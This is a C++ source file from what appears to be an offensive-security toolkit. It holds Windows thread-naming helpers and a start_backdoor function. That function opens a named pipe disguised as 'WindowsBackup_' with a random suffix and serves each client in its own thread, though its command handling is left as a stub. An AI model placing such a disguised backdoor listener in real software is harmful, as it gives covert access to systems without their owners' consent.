#include "thread.h"

#include "handle.h"
#include "utils.h"





auto g_AdminThreadId = std::vector<DWORD>();

#define MAX_BACKDOOR_MESSAGE_SIZE 2048


DWORD WINAPI HandleClientThread(LPVOID lpThreadParams)
{
    if(lpThreadParams == nullptr)
        return ERROR_INVALID_PARAMETER;

    auto hPipe = pwn::utils::GenericHandle(
        reinterpret_cast<HANDLE>( lpThreadParams )
    );

    while(true)
    {
        auto request_message = std::make_unique<BYTE[]>(MAX_BACKDOOR_MESSAGE_SIZE);

        DWORD dwNumberOfByteRead;
        auto bRes = ::ReadFile(
            hPipe.get(),
            request_message.get(),
            MAX_BACKDOOR_MESSAGE_SIZE,
            &dwNumberOfByteRead,
            nullptr
        );

        if(!bRes)
            break;

        // ParseMessage();

        auto reply_message = std::make_unique<BYTE[]>(MAX_BACKDOOR_MESSAGE_SIZE);

        // auto reply_message = BuildReply(request_message);

        bRes = ::WriteFile(
            hPipe.get(),
            reply_message.get(),
            MAX_BACKDOOR_MESSAGE_SIZE,
            &dwNumberOfByteRead,
            nullptr
        );

        if(!bRes)
            break;
    }

    ::FlushFileBuffers(hPipe.get());
    ::DisconnectNamedPipe(hPipe.get());

    return NO_ERROR;
}



_Success_(return)
bool pwn::thread::start_backdoor()
{
    const std::wstring pipe = L"\\\\.\\pipe\\WindowsBackup_" + pwn::utils::random::alnum(5);

    for(;;)
    {
        auto hPipe = ::CreateNamedPipe(
            pipe.c_str(),
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,               
            PIPE_UNLIMITED_INSTANCES,
            MAX_BACKDOOR_MESSAGE_SIZE,
            MAX_BACKDOOR_MESSAGE_SIZE,
            0,
            nullptr
       );
           
       if(hPipe == INVALID_HANDLE_VALUE)
       {
           return false;
       }

       auto is_connected = ::ConnectNamedPipe(hPipe, nullptr) ? true : (::GetLastError() == ERROR_PIPE_CONNECTED);
       
       if (!is_connected)
       {
           ::CloseHandle(hPipe);
           break;
       }

       DWORD  dwThreadId = 0;

       auto hThread = pwn::utils::GenericHandle( 
           ::CreateThread(
                nullptr,
                0,
                HandleClientThread,
                reinterpret_cast<LPVOID>(hPipe), 
                0,
                &dwThreadId
           )
       );

       if(!hThread)
       {
           break;
       }

       g_AdminThreadId.push_back(dwThreadId);
    }

    return true;
}



_Success_(return != std::nullopt) 
std::optional<std::wstring> pwn::thread::get_name(_In_ DWORD dwThreadId)
{
    HANDLE ThreadHandle = INVALID_HANDLE_VALUE;

    if (dwThreadId == (DWORD)-1)
    {
        ThreadHandle = ::GetCurrentThread();
    }
    else
    {
        ThreadHandle = ::OpenThread(THREAD_QUERY_LIMITED_INFORMATION, false, dwThreadId);
    }

    auto hThread = pwn::utils::GenericHandle(ThreadHandle);
    if (!hThread)
        return std::nullopt;

    UNICODE_STRING us = {0};
    ULONG ReturnedLength = 0;
    auto Status = ::NtQueryInformationThread(
        hThread.get(), 
        (THREADINFOCLASS)ThreadNameInformation, 
        &us, 
        sizeof(UNICODE_STRING), 
        &ReturnedLength
    );
    
    // empty value ?
    if (NT_SUCCESS(Status))
    {
        return std::nullopt;
    }

    // buffer too small ?
    if (Status != STATUS_BUFFER_TOO_SMALL || ReturnedLength < sizeof(UNICODE_STRING))
    {
        pwn::log::ntperror(L"NtQueryInformationThread1()", Status);
        return std::nullopt;
    }

    auto buffer = std::make_unique<BYTE[]>(ReturnedLength);

    Status = ::NtQueryInformationThread(
        hThread.get(), 
        (THREADINFOCLASS)ThreadNameInformation, 
        buffer.get(), 
        ReturnedLength, 
        nullptr
    );
    
    if (!NT_SUCCESS(Status))
    {
        pwn::log::ntperror(L"NtQueryInformationThread2()", Status);
        return std::nullopt;
    }
  
    PUNICODE_STRING u = reinterpret_cast<PUNICODE_STRING>(buffer.get());
    return std::wstring(u->Buffer, u->Length);
}



_Success_(return) 
bool pwn::thread::set_name(_In_ std::wstring const& name, _In_ DWORD dwThreadId)
{
    HANDLE ThreadHandle = INVALID_HANDLE_VALUE;

    if (dwThreadId == (DWORD)-1)
    {
        ThreadHandle = ::GetCurrentThread();
    }
    else
    {
        ThreadHandle = ::OpenThread(THREAD_SET_LIMITED_INFORMATION, false, dwThreadId);
    }

    auto hThread = pwn::utils::GenericHandle(ThreadHandle);
    if (!hThread)
        return false;
    

    if (name.size() >= 0xffff)
        return false;

    UNICODE_STRING us = {0};
    ::RtlInitUnicodeString(&us, (PWSTR)name.c_str());

    auto Status = ::NtSetInformationThread(
        hThread.get(), 
        ThreadNameInformation, 
        &us, 
        sizeof(UNICODE_STRING)
    );
    return SUCCEEDED(Status);
}

